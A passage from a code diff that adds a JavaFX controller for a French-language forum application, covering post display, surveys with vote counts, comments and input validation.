+                    errors.append("- La description ne peut pas être vide\n");
+                    isValid = false;
+                }
+                if (newValue.length() > 100) {
+                    errors.append("- La description ne doit pas dépasser 100 caractères\n");
+                    isValid = false;
+                }
+                break;
+        }
+
+        if (!isValid) {
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("Erreur de modification");
+            alert.setHeaderText("Veuillez corriger les erreurs suivantes:");
+            alert.setContentText(errors.toString());
+            alert.showAndWait();
+            refreshTableFB();
+            return false;
+        }
+
+        return true;
+    }
+
+    private void updateMemberCount() {
+        if (isPrivateCheckBox.isSelected()) {
+            int memberCount = membersListView.getItems().size();
+            Forum selectedForum = forumTableView.getSelectionModel().getSelectedItem();
+            if (selectedForum != null) {
+                selectedForum.setNbrMembers(memberCount);
+                selectedForum.setListMembers(String.join(",", membersListView.getItems()));
+                updateForum(selectedForum);
+            }
+        }
+    }
+
+//***************************************
+
+    private void handlePostTypeChange() {
+        String selectedType = postTypeComboBox.getValue();
+        announcementFields.setVisible("Announcement".equals(selectedType));
+        surveyFields.setVisible("Survey".equals(selectedType));
+
+        if ("Announcement".equals(selectedType)) {
+            clearSurveyFields();
+        } else {
+            clearAnnouncementFields();
+        }
+    }
+
+    private void loadForums() {
+        List<Forum> forums = forumServiceFP.rechercher();
+        forumComboBox.getItems().clear();
+        forumComboBox.getItems().addAll(forums);
+        forumComboBox.getSelectionModel().select(0);
+        updateForumInfo();
+        forumComboBox.setConverter(new StringConverter<Forum>() {
+            @Override
+            public String toString(Forum forum) {
+                return forum != null ? forum.getName() : "";
+            }
+
+            @Override
+            public Forum fromString(String string) {
+                return null;
+            }
+        });
+    }
+
+    private void updateForumInfo() {
+        Forum selectedForum = forumComboBox.getValue();
+        if (selectedForum != null) {
+            forumDescription.setText(selectedForum.getDescription());
+            forumPrivacyLabel.setText(selectedForum.isPrivate() ? "Private" : "Public");
+            forumDateLabel.setText("Created: " + formatDateTime(selectedForum.getDateCreation()).toString());
+
+            if (selectedForum.isPrivate()) {
+                memberCountLabel.setText("Members: " + selectedForum.getNbrMembers());
+                membersSection.setVisible(true);
+
+                membersListViewFP.getItems().clear();
+                if (selectedForum.getListMembers() != null && !selectedForum.getListMembers().isEmpty()) {
+                    String[] members = selectedForum.getListMembers().split(",");
+                    for (String member : members) {
+                        membersListViewFP.getItems().add(member);
+                    }
+                }
+            } else {
+                memberCountLabel.setText("");
+                membersSection.setVisible(false);
+            }
+            handleBackButton();
+            refreshPosts();
+        }
+    }
+
+    private void setupValidationListeners() {
+
+        announcementTitleField.textProperty().addListener((obs, old, newValue) ->
+                validateAnnouncementTitle(newValue));
+
+        announcementContentField.textProperty().addListener((obs, old, newValue) ->
+                validateAnnouncementContent(newValue));
+
+        announcementTagsField.textProperty().addListener((obs, old, newValue) ->
+                validateTags(newValue, tagsErrorLabel));
+
+        surveyQuestionField.textProperty().addListener((obs, old, newValue) ->
+                validateSurveyQuestion(newValue));
+
+        surveyTagsField.textProperty().addListener((obs, old, newValue) ->
+                validateTags(newValue, surveyTagsErrorLabel));
+
+        newCommentField.textProperty().addListener((obs, old, newValue) ->
+                validateComment(newValue));
+    }
+
+    private void refreshPosts2() {
+        // Clear the current posts in the VBox
+        postsVBox.getChildren().clear();
+
+        // Get the currently selected forum
+        Forum selectedForum = forumComboBox.getValue();
+
+        if (selectedForum != null) {
+            // Fetch posts from the database that belong to the selected forum
+            List<Post> posts = postService.rechercher().stream()
+                    .filter(p -> p.getForumId() == selectedForum.getForumId())
+                    .filter(p -> (p instanceof Announcement) || (p instanceof Survey))
+                    .toList();
+
+            // Display each post in the VBox
+            for (Post post : posts) {
+                VBox postBox = displayPost(post); // Create a VBox for the post
+                postsVBox.getChildren().add(postBox); // Add the post to the VBox
+            }
+        }
+    }
+
+    private void refreshPosts() {
+        postsVBox.getChildren().clear();
+        Forum selectedForum = forumComboBox.getValue();
+
+        if (selectedForum != null) {
+            List<Post> posts = postService.rechercher().stream()
+                    .filter(p -> p.getForumId() == selectedForum.getForumId())
+                    .filter(p -> (p instanceof Announcement) || (p instanceof Survey))
+                    .toList();
+
+            for (Post post : posts) {
+                VBox postBox = displayPost(post);
+                postsVBox.getChildren().add(postBox);
+            }
+        }
+    }
+
+    private VBox displayPost(Post post) {
+        VBox postBox = new VBox(10);
+        postBox.getStyleClass().add("post-box");
+        postBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 15;");
+        postBox.setAlignment(Pos.CENTER);
+
+        Label postTitle = new Label();
+        postTitle.getStyleClass().add("post-title");
+        postTitle.setStyle("-fx-text-fill: white; -fx-font-size: 28px; -fx-font-weight: bold;");
+
+        Label postTags = new Label();
+        postTags.getStyleClass().add("post-tags");
+
+        Label postDate = new Label();
+        postDate.getStyleClass().add("post-metadata");
+        postDate.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 22px;");
+
+        HBox voteBox = new HBox(5);
+        voteBox.getStyleClass().add("vote-box");
+        voteBox.setAlignment(Pos.CENTER);
+
+        Button upVoteBtn = new Button("↑");
+        upVoteBtn.getStyleClass().add("vote-button");
+        upVoteBtn.setStyle("-fx-font-size: 16px; -fx-min-width: 40px; -fx-min-height: 40px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+
+        Button downVoteBtn = new Button("↓");
+        downVoteBtn.getStyleClass().add("vote-button");
+        downVoteBtn.setStyle("-fx-font-size: 16px; -fx-min-width: 40px; -fx-min-height: 40px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+
+        Label voteCount = new Label(String.valueOf(post.getVotes()));
+        voteCount.getStyleClass().add("vote-count");
+        voteCount.setStyle("-fx-text-fill: white; -fx-font-size: 26px; -fx-font-weight: bold;");
+
+        upVoteBtn.setOnAction(e -> {
+            post.setVotes(post.getVotes() + 1);
+            postService.modifier(post);
+            refreshPosts();
+        });
+
+        downVoteBtn.setOnAction(e -> {
+            post.setVotes(post.getVotes() - 1);
+            postService.modifier(post);
+            refreshPosts();
+        });
+
+        voteBox.getChildren().addAll(upVoteBtn, voteCount, downVoteBtn);
+
+        Button viewCommentsButton = new Button("Voir Plus des détails");
+        viewCommentsButton.getStyleClass().add("view-comments-button");
+        viewCommentsButton.setStyle("-fx-font-size: 19px; -fx-background-color: rgba(42,131,45,0.6); -fx-text-fill: white; -fx-background-radius: 5;");
+        viewCommentsButton.setOnAction(e -> showComments(post));
+
+        HBox bottomRightControls = new HBox(10);
+        bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
+
+        Button editPostButton = new Button("Modifier");
+        editPostButton.getStyleClass().add("edit-button");
+        editPostButton.setStyle("-fx-font-size: 19px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        Button deletePostButton = new Button("Supprimer");
+        deletePostButton.getStyleClass().add("delete-button");
+        deletePostButton.setStyle("-fx-font-size: 19px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        editPostButton.setOnAction(e -> {
+            editPost(post);
+            handleEditButton(post);
+        });
+
+        deletePostButton.setOnAction(e -> {
+            currentPost = post;
+            handleDeletePost();
+        });
+
+        bottomRightControls.getChildren().addAll(editPostButton, deletePostButton);
+
+        ImageView imageView = null;
+        if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
+            try {
+                imageView = new ImageView(new Image(new File(post.getCheminFichier()).toURI().toString()));
+                imageView.setFitWidth(600);
+                imageView.setFitHeight(400);
+                imageView.setPreserveRatio(true);
+                imageView.setStyle("-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.5), 10, 0, 0, 0); -fx-background-radius: 10;");
+            } catch (Exception e) {
+                System.out.println("Erreur de chargement de l'image : " + e.getMessage());
+            }
+        }
+
+        VBox centerContent = new VBox(10);
+        centerContent.setAlignment(Pos.CENTER);
+
+        if (post instanceof Announcement announcement) {
+            postTitle.setText(announcement.getAnnouncementTitle());
+
+            String tags = announcement.getAnnouncementTags();
+            if (tags != null && !tags.isEmpty()) {
+                String[] tagArray = tags.replace(",", " ").split(" ");
+                StringBuilder formattedTags = new StringBuilder("Tags : ");
+                for (String tag : tagArray) {
+                    if (!tag.isEmpty()) { // Skip empty strings
+                        if (!tag.startsWith("#")) {
+                            formattedTags.append("#").append(tag).append(" ");
+                        } else {
+                            formattedTags.append(tag).append(" ");
+                        }
+                    }
+                }
+                postTags.setText(formattedTags.toString().trim()); // Remove trailing space
+            } else {
+                postTags.setText("Tags : "); // No tags
+            }
+
+            postTags.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
+
+            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+
+            if (imageView != null) {
+                centerContent.getChildren().add(imageView);
+            }
+            centerContent.getChildren().addAll(postTitle);
+
+        } else if (post instanceof Survey survey) {
+            postTitle.setText(survey.getSurveyQuestion());
+
+            // Format tags as "Tags : #test #tags #fun"
+            String tags = survey.getSurveyTags();
+            if (tags != null && !tags.isEmpty()) {
+                String[] tagArray = tags.replace(",", " ").split(" ");
+                StringBuilder formattedTags = new StringBuilder("Tags : ");
+                for (String tag : tagArray) {
+                    if (!tag.isEmpty()) { // Skip empty strings
+                        if (!tag.startsWith("#")) {
+                            formattedTags.append("#").append(tag).append(" ");
+                        } else {
+                            formattedTags.append(tag).append(" ");
+                        }
+                    }
+                }
+                postTags.setText(formattedTags.toString().trim()); // Remove trailing space
+            } else {
+                postTags.setText("Tags : "); // No tags
+            }
+
+            postTags.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
+
+            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+
+            if (imageView != null) {
+                centerContent.getChildren().add(imageView);
+            }
+            centerContent.getChildren().add(postTitle);
+
+            VBox choicesBox = new VBox(5);
+            choicesBox.setAlignment(Pos.CENTER); // Center the survey choices
+
+            List<Choix> choices = choixService.rechercher().stream()
+                    .filter(c -> c.getPostId() == survey.getPostId())
+                    .toList();
+
+            int totalVotes = choices.stream()
+                    .mapToInt(Choix::getChoiceVotesCount)
+                    .sum();
+
+            for (Choix choice : choices) {
+                HBox choiceBox = new HBox(10);
+                choiceBox.setAlignment(Pos.CENTER);
+
+                Button voteBtn = new Button(choice.getChoix());
+                voteBtn.setStyle("-fx-font-size: 24px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+                voteBtn.setOnAction(e -> handleChoiceVote(choice));
+
+                Label voteInfo = new Label(String.format("%d votes (%.1f%%)",
+                        choice.getChoiceVotesCount(),
+                        totalVotes > 0 ? (choice.getChoiceVotesCount() * 100.0f) / totalVotes : 0));
+                voteInfo.setStyle("-fx-text-fill: white; -fx-font-size: 22px;");
+
+                choiceBox.getChildren().addAll(voteBtn, voteInfo);
+                choicesBox.getChildren().add(choiceBox);
+            }
+
+            centerContent.getChildren().add(choicesBox);
+        }
+
+        VBox leftContent = new VBox(10);
+        leftContent.setAlignment(Pos.CENTER_LEFT);
+        leftContent.getChildren().addAll(postTags, postDate, viewCommentsButton);
+
+        postBox.getChildren().addAll(centerContent, leftContent, voteBox, bottomRightControls);
+
+        return postBox;
+    }
+
+    private void showPostDetails(Post post) {
+        postDetailsBox.getChildren().clear();
+        postDetailsBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 15;");
+        postDetailsBox.setAlignment(Pos.CENTER); // Center everything in the postDetailsBox
+
+        // User Image and Name
+        HBox userInfoBox = new HBox(10);
+        userInfoBox.setAlignment(Pos.CENTER_LEFT);
+
+        // Load user image
+        ImageView userImageView = new ImageView();
+        userImageView.setFitWidth(40);
+        userImageView.setFitHeight(40);
+        userImageView.setPreserveRatio(true);
+        userImageView.setStyle("-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.5), 10, 0, 0, 0); -fx-background-radius: 20;");
+
+        ClientServices clientServices = new ClientServices();
+        String userEmail = forumService.getEmailById(post.getIdUser());
+        Image userImage = clientServices.loadImageFromDatabase(userEmail);
+        if (userImage != null) {
+            userImageView.setImage(userImage);
+        }
+
+        Label userNameLabel = new Label(forumService.getUserFullNameById(post.getIdUser()));
+        userNameLabel.setStyle("-fx-text-fill: white; -fx-font-size: 20px;");
+
+        userInfoBox.getChildren().addAll(userImageView, userNameLabel);
+
+        Label titleLabel = new Label();
+        titleLabel.getStyleClass().add("post-title");
+        titleLabel.setStyle("-fx-text-fill: white; -fx-font-size: 28px; -fx-font-weight: bold;");
+
+        Label contentLabel = new Label(); // Use Label instead of Text for better styling
+        contentLabel.getStyleClass().add("post-content");
+        contentLabel.setStyle("-fx-text-fill: white; -fx-font-size: 24px;");
+        contentLabel.setWrapText(true); // Wrap text to fit the width
+
+        Label tagsLabel = new Label();
+        tagsLabel.getStyleClass().add("post-tags");
+
+        Label postDate = new Label();
+        postDate.getStyleClass().add("post-metadata");
+        postDate.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 22px;");
+
+        HBox votingBox = new HBox(5);
+        votingBox.getStyleClass().add("vote-box");
+        votingBox.setAlignment(Pos.CENTER);
+
+        Button upVoteBtn = new Button("↑");
+        upVoteBtn.getStyleClass().add("vote-button");
+        upVoteBtn.setStyle("-fx-font-size: 16px; -fx-min-width: 40px; -fx-min-height: 40px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+
+        Button downVoteBtn = new Button("↓");
+        downVoteBtn.getStyleClass().add("vote-button");
+        downVoteBtn.setStyle("-fx-font-size: 16px; -fx-min-width: 40px; -fx-min-height: 40px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+
+        Label voteCount = new Label(String.valueOf(post.getVotes()));
+        voteCount.getStyleClass().add("vote-count");
+        voteCount.setStyle("-fx-text-fill: white; -fx-font-size: 26px; -fx-font-weight: bold;");
+
+        upVoteBtn.setOnAction(e -> handleVote(post, true));
+        downVoteBtn.setOnAction(e -> handleVote(post, false));
+
+        votingBox.getChildren().addAll(upVoteBtn, voteCount, downVoteBtn);
+
+        HBox bottomRightControls = new HBox(10);
+        bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
+
+        Button editBtn = new Button("Modifier");
+        editBtn.getStyleClass().add("edit-button");
+        editBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        Button deleteBtn = new Button("Supprimer");
+        deleteBtn.getStyleClass().add("delete-button");
+        deleteBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        editBtn.setOnAction(e -> handleEditButton(post));
+        deleteBtn.setOnAction(e -> handleDeletePost(post));
+
+        bottomRightControls.getChildren().addAll(editBtn, deleteBtn);
+
+        ImageView imageView = null;
+        if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
+            try {
+                imageView = new ImageView(new Image(new File(post.getCheminFichier()).toURI().toString()));
+                imageView.setFitWidth(600);
+                imageView.setFitHeight(400);
+                imageView.setPreserveRatio(true);
+                imageView.setStyle("-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.5), 10, 0, 0, 0); -fx-background-radius: 10;");
+            } catch (Exception e) {
+                System.out.println("Erreur de chargement de l'image : " + e.getMessage());
+            }
+        }
+
+        VBox centerContent = new VBox(10);
+        centerContent.setAlignment(Pos.CENTER);
+
+        if (post instanceof Announcement announcement) {
+            titleLabel.setText(announcement.getAnnouncementTitle());
+            contentLabel.setText(announcement.getAnnouncementContent()); // Use Label for content
+
+            String tags = announcement.getAnnouncementTags();
+            if (tags != null && !tags.isEmpty()) {
+                String[] tagArray = tags.replace(",", " ").split(" ");
+                StringBuilder formattedTags = new StringBuilder("Tags : ");
+                for (String tag : tagArray) {
+                    if (!tag.isEmpty()) { // Skip empty strings
+                        if (!tag.startsWith("#")) {
+                            formattedTags.append("#").append(tag).append(" ");
+                        } else {
+                            formattedTags.append(tag).append(" ");
+                        }
+                    }
+                }
+                tagsLabel.setText(formattedTags.toString().trim()); // Remove trailing space
+            } else {
+                tagsLabel.setText("Tags : "); // No tags
+            }
+
+            tagsLabel.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
+
+            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+
+            if (imageView != null) {
+                centerContent.getChildren().add(imageView);
+            }
+            centerContent.getChildren().addAll(titleLabel, contentLabel);
+
+        } else if (post instanceof Survey survey) {
+            titleLabel.setText(survey.getSurveyQuestion());
+
+            String tags = survey.getSurveyTags();
+            if (tags != null && !tags.isEmpty()) {
+                String[] tagArray = tags.replace(",", " ").split(" ");
+                StringBuilder formattedTags = new StringBuilder("Tags : ");
+                for (String tag : tagArray) {
+                    if (!tag.isEmpty()) {
+                        if (!tag.startsWith("#")) {
+                            formattedTags.append("#").append(tag).append(" ");
+                        } else {
+                            formattedTags.append(tag).append(" ");
+                        }
+                    }
+                }
+                tagsLabel.setText(formattedTags.toString().trim());
+            } else {
+                tagsLabel.setText("Tags : ");
+            }
+
+            // Style tags with color #e78d1e and bold
+            tagsLabel.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
+
+            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+
+            // Add image and title to centerContent
+            if (imageView != null) {
+                centerContent.getChildren().add(imageView);
+            }
+            centerContent.getChildren().add(titleLabel);
+
+            // Survey Choices
+            VBox choicesBox = new VBox(5);
+            choicesBox.setAlignment(Pos.CENTER);
+
+            List<Choix> choices = choixService.rechercher().stream()
+                    .filter(c -> c.getPostId() == survey.getPostId())
+                    .toList();
+
+            int totalVotes = choices.stream()
+                    .mapToInt(Choix::getChoiceVotesCount)
+                    .sum();
+
+            for (Choix choice : choices) {
+                HBox choiceBox = new HBox(10);
+                choiceBox.setAlignment(Pos.CENTER);
+
+                Button voteBtn = new Button(choice.getChoix());
+                voteBtn.setStyle("-fx-font-size: 24px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
+                voteBtn.setOnAction(e -> handleChoiceVote(choice));
+
+                Label voteInfo = new Label(String.format("%d votes (%.1f%%)",
+                        choice.getChoiceVotesCount(),
+                        totalVotes > 0 ? (choice.getChoiceVotesCount() * 100.0f) / totalVotes : 0));
+                voteInfo.setStyle("-fx-text-fill: white; -fx-font-size: 22px;");
+
+                choiceBox.getChildren().addAll(voteBtn, voteInfo);
+                choicesBox.getChildren().add(choiceBox);
+            }
+
+            centerContent.getChildren().add(choicesBox);
+        }
+
+        VBox leftContent = new VBox(10);
+        leftContent.setAlignment(Pos.CENTER_LEFT);
+        leftContent.getChildren().addAll(tagsLabel, postDate);
+
+        VBox mainContent = new VBox(10);
+        mainContent.getChildren().addAll(userInfoBox, centerContent);
+
+        postDetailsBox.getChildren().addAll(mainContent, leftContent, votingBox, bottomRightControls);
+    }
+
+    //+++++++++++
+    private void showComments(Post post) {
+        currentPost = post;
+
+        leftTabPane.getSelectionModel().select(1);
+
+        showPostDetails(post);
+
+        loadComments();
+    }
+
+    private void loadComments() {
+
+        commentsVBox.getChildren().clear();
+
+        List<Comment> comments = postService.rechercher().stream()
+                .filter(p -> p instanceof Comment)
+                .map(p -> (Comment) p)
+                .filter(c -> c.getParentId() == currentPost.getPostId())
+                .toList();
+
+        for (Comment comment : comments) {
+            displayComment(comment);
+        }
+    }
+
+    private void displayComment(Comment comment) {
+        HBox commentBox = new HBox(10);
+        commentBox.getStyleClass().add("comment-box");
+        commentBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 10;");
+
+        HBox topSection = new HBox(10);
+        topSection.setAlignment(Pos.TOP_LEFT);
+
+        HBox buttonsBox = new HBox(5);
+        buttonsBox.setAlignment(Pos.BASELINE_LEFT);
+
+        Button editBtn = new Button("Editer");
+        editBtn.getStyleClass().add("edit-button");
+        editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        Button deleteBtn = new Button("Supprimer");
+        deleteBtn.getStyleClass().add("delete-button");
+        deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        editBtn.setOnAction(e -> handleEditComment(comment));
+        deleteBtn.setOnAction(e -> handleDeleteComment(comment));
+
+
+        HBox userInfoBox = new HBox(10);
+        userInfoBox.setAlignment(Pos.TOP_RIGHT);
+
+        ImageView userImageView = new ImageView();
+        userImageView.setFitWidth(30);
+        userImageView.setFitHeight(30);
+        userImageView.setPreserveRatio(true);
+        userImageView.setStyle("-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.5), 10, 0, 0, 0); -fx-background-radius: 15;");
+
+        ClientServices clientServices = new ClientServices();
+        String userEmail = forumService.getEmailById(comment.getIdUser());
+        Image userImage = clientServices.loadImageFromDatabase(userEmail);
+        if (userImage != null) {
+            userImageView.setImage(userImage);
+        }
+
+        Label userNameLabel = new Label(forumService.getUserFullNameById(comment.getIdUser()));
+        userNameLabel.setStyle("-fx-text-fill: white; -fx-font-size: 16px;");
+
+        userInfoBox.getChildren().addAll(userImageView, userNameLabel);
+
+        topSection.getChildren().addAll(userInfoBox);
+
+        Label contentLabel = new Label(comment.getCommentContent());
+        contentLabel.setStyle("-fx-text-fill: white; -fx-font-size: 18px; -fx-wrap-text: true;");
+
+        Label dateLabel = new Label(formatDateTime(comment.getDateCreation()).toString());
+        dateLabel.getStyleClass().add("comment-date");
+        dateLabel.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 14px;");
+
+        Button replyBtn = new Button("Répondre");
+        replyBtn.getStyleClass().add("reply-button");
+        replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        buttonsBox.getChildren().addAll(replyBtn, editBtn, deleteBtn);
+
+        VBox contentBox = new VBox(5);
+        contentBox.setAlignment(Pos.CENTER_LEFT);
+        contentBox.getChildren().addAll(topSection, contentLabel, dateLabel, buttonsBox);
+
+        commentBox.getChildren().add(contentBox);
+
+        commentsVBox.getChildren().add(commentBox);
+    }
+
+    private void handleEditComment(Comment comment) {
+        TextInputDialog dialog = new TextInputDialog(comment.getCommentContent());
+        dialog.setTitle("Edit Comment");
+        dialog.setHeaderText(null);
+        dialog.setContentText("Enter new comment:");
+
+        dialog.showAndWait().ifPresent(newContent -> {
+            comment.setCommentContent(newContent);
+            postService.modifier(comment);
+            loadComments();
+        });
+    }
+
+    private void handleDeleteComment(Comment comment) {
+        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
+        confirm.setTitle("Delete Comment");
+        confirm.setHeaderText("Are you sure you want to delete this comment?");
+        confirm.setContentText("This action cannot be undone.");
+
+        if (confirm.showAndWait().get() == ButtonType.OK) {
+            postService.supprimer(comment);
+            loadComments();
+        }
+    }
+
+    //+++++++++++
+    private void clearSurveyFields() {
+        surveyQuestionField.clear();
+        surveyTagsField.clear();
+        choicesListView.getItems().clear();
+        choiceField.clear();
+        addChoiceButton.setDisable(true);
+    }
+
+    private void clearAnnouncementFields() {
+        announcementTitleField.clear();
+        announcementContentField.clear();
+        announcementTagsField.clear();
+    }
+
+    private void clearFieldsFB() {
+
+        announcementTitleField.clear();
+        announcementContentField.clear();
+        announcementTagsField.clear();
+        announcementFileField.clear();
+        announcementStatusComboBox.setValue("active");
+
+        surveyQuestionField.clear();
+        surveyTagsField.clear();
+        surveyFileField.clear();
+        surveyStatusComboBox.setValue("active");
+        surveyUserField.clear();
+        surveyUsersListView.getItems().clear();
+        choicesListView.getItems().clear();
+        choiceField.clear();
+        addChoiceButton.setDisable(true);
+
+        titleErrorLabel.setVisible(false);
+        contentErrorLabel.setVisible(false);
+        tagsErrorLabel.setVisible(false);
+        questionErrorLabel.setVisible(false);
+        surveyTagsErrorLabel.setVisible(false);
+        commentErrorLabel.setVisible(false);
+        choiceErrorLabel.setVisible(false);
+        surveyUserErrorLabel.setVisible(false);
+        announcementFileErrorLabel.setVisible(false);
+        surveyFileErrorLabel.setVisible(false);
+
+        postTypeComboBox.getSelectionModel().clearSelection();
+        announcementFields.setVisible(false);
+        surveyFields.setVisible(false);
+
+
+        newCommentField.clear();
+        commentsVBox.getChildren().clear();
+
+
+        clearEditFields();
+
+        announcementUserField.clear();
+        surveyAuthorField.clear();
+        editAnnouncementUserField.clear();
+        editSurveyAuthorField.clear();
+
+        announcementUserErrorLabel.setVisible(false);
+        surveyAuthorErrorLabel.setVisible(false);
+        editAnnouncementUserErrorLabel.setVisible(false);
+        editSurveyAuthorErrorLabel.setVisible(false);
+    }
+
+    private void clearEditFields() {
+        editAnnouncementTitleField.clear();
+        editAnnouncementContentField.clear();
+        editAnnouncementTagsField.clear();
+        editAnnouncementFileField.clear();
+        editAnnouncementStatusComboBox.setValue("active");
+
+        editSurveyQuestionField.clear();
+        editSurveyTagsField.clear();
+        editChoiceField.clear();
+        editChoicesListView.getItems().clear();
+        editSurveyFileField.clear();
+        editSurveyStatusComboBox.setValue("active");
+        editSurveyUserField.clear();
+        editSurveyUsersListView.getItems().clear();
+
+        editAnnouncementFields.setVisible(false);
+        editSurveyFields.setVisible(false);
+    }
+
+    //+++++++++++
+    private void validateUserEmail(TextField field, Label errorLabel, String email) {
+        if (email.isEmpty()) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "L'email ne peut pas être vide");
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "Format d'email invalide");
+        } else if (forumServiceFP.getUserByEmail(email) == -1) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "Cet utilisateur n'existe pas");
+        } else {
+            field.getStyleClass().remove("text-field-error");
+            field.getStyleClass().add("valid-field");
+            hideError(field, errorLabel);
+        }
+    }
+
+    private boolean validateImageFile(TextField fileField, Label errorLabel) {
+        String filePath = fileField.getText().trim();
+
+        if (filePath.isEmpty()) {
+            hideError(fileField, errorLabel);
+            return true;
+        }
+
+        String extension = filePath.substring(filePath.lastIndexOf(".") + 1).toLowerCase();
+
+        if (!extension.equals("jpg") && !extension.equals("png")) {
+            showError(fileField, errorLabel, "Only JPG or PNG files are allowed.");
+            showAlertFP("Thats is not Allowed", "Only JPG or PNG files are allowed.", Alert.AlertType.ERROR);
+            return false;
+        }
+
+        hideError(fileField, errorLabel);
+        return true;
+    }
+
+    private void validateAnnouncementTitle(String title) {
+        if (title.isEmpty()) {
+            showError(announcementTitleField, titleErrorLabel, "Le titre ne peut pas être vide");
+        } else if (title.length() > 50) {
+            showError(announcementTitleField, titleErrorLabel, "Le titre ne doit pas dépasser 50 caractères");
+        } else {
+            hideError(announcementTitleField, titleErrorLabel);
+        }
+    }
+
+    private void validateAnnouncementContent(String content) {
+        if (content.isEmpty()) {
+            showError(announcementContentField, contentErrorLabel, "Le contenu ne peut pas être vide");
+        } else if (content.length() > 500) {
+            showError(announcementContentField, contentErrorLabel, "Le contenu ne doit pas dépasser 500 caractères");
+        } else {
+            hideError(announcementContentField, contentErrorLabel);
+        }
+    }
+
+    private void validateTags(String tags, Label errorLabel) {
+        TextField field = tags.equals(surveyTagsField.getText()) ? surveyTagsField : announcementTagsField;
+
+        if (tags.length() > 100) {
+            showError(field, errorLabel, "Les tags ne doivent pas dépasser 100 caractères");
+            return;
+        }
+
+        if (!tags.isEmpty()) {
+
+            if (!tags.matches("^[a-zA-Z0-9,\\s]+$")) {
+                showError(field, errorLabel, "Les tags ne doivent contenir que des lettres, chiffres et virgules");
+                return;
+            }
+
+            String[] tagArray = tags.split(",");
+            Set<String> uniqueTags = new HashSet<>();
+
+            for (String tag : tagArray) {
+                String trimmedTag = tag.trim();
+                if (!trimmedTag.isEmpty()) {
+                    if (!uniqueTags.add(trimmedTag)) {
+                        showError(field, errorLabel, "Tag '" + trimmedTag + "' est en double");
+                        return;
+                    }
+                }
+            }
+
+            for (String tag : tagArray) {
+                String trimmedTag = tag.trim();
+                if (trimmedTag.length() > 20) {
+                    showError(field, errorLabel, "Chaque tag ne doit pas dépasser 20 caractères");
+                    return;
+                }
+            }
+        }
+
+        hideError(field, errorLabel);
+    }
+
+    private void validateComment(String comment) {
+        if (comment.isEmpty()) {
+            showError(newCommentField, commentErrorLabel, "Le commentaire ne peut pas être vide");
+        } else if (comment.length() > 200) {
+            showError(newCommentField, commentErrorLabel, "Le commentaire ne doit pas dépasser 200 caractères");
+        } else {
+            hideError(newCommentField, commentErrorLabel);
+        }
+    }
+
+    private void validateChoice(String choice) {
+        if (choice.isEmpty()) {
+            addChoiceButton.setDisable(true);
+            showError(choiceField, choiceErrorLabel, "Le choix ne peut pas être vide");
+        } else if (choice.length() > 50) {
+            addChoiceButton.setDisable(true);
+            showError(choiceField, choiceErrorLabel, "Le choix ne doit pas dépasser 50 caractères");
+        } else if (choicesListView.getItems().contains(choice)) {
+            addChoiceButton.setDisable(true);
+            showError(choiceField, choiceErrorLabel, "Ce choix existe déjà");
+        } else {
+            hideError(choiceField, choiceErrorLabel);
+            addChoiceButton.setDisable(false);
+        }
+    }
+
+    private void validateSurveyQuestion(String question) {
+        if (question.isEmpty()) {
+            showError(surveyQuestionField, questionErrorLabel, "La question ne peut pas être vide");
+        } else if (question.length() > 200) {
+            showError(surveyQuestionField, questionErrorLabel, "La question ne doit pas dépasser 200 caractères");
+        } else {
